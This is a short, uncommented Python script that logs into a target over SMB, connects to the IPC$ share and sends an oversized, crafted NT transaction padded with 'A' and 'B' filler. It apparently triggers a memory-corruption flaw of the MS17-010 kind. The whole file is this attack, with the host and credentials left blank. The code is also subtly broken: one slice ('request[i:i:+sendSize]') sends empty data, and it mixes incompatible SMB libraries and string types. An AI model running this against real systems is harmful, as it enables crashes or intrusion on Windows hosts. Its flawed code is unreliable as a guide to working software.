from impacket import smb
from smb import SMB
from struct import pack

USERNAME = ''
PASSWORD = ''
HOST = ''

conn = SMB(HOST)
conn.login(USERNAME, PASSWORD)

tid = conn.tree_connect_andx('\\\\'+ HOST+'\\'+'IPC$')
conn.set_default_tid(tid)

request = pack('<I', 0x10000)
request += pack('<BBH', 0, 0, 0xc003) + 'A'*0xc004
request += pack('<BBH', 0, 0, 0xc000) + 'B'*0x4000

multiplex_id = conn.multiplex_id()

TRANS2_OPEN2 = 0
conn.send_nt_transaction(2, setup=pack('H', TRANS2_OPEN2), mid=multiplex_id, param='\x00'*30, data=request[:1000], totalDataCount=len(request))
i = 1000
while i < len(request):
    sendSize = min(4096, len(request) - i)

    if len(request) - i <=4096:
        conn.send_trans2_secondary(multiplex_id, data=request[i:i:+sendSize], dataDisplacement=i)
    else:
        conn.send_nt_trans_secondary(multiplex_id, data=request[i:i+sendSize], dataDisplacement=i)
    i +=sendSize

conn.recvSMB()

conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()

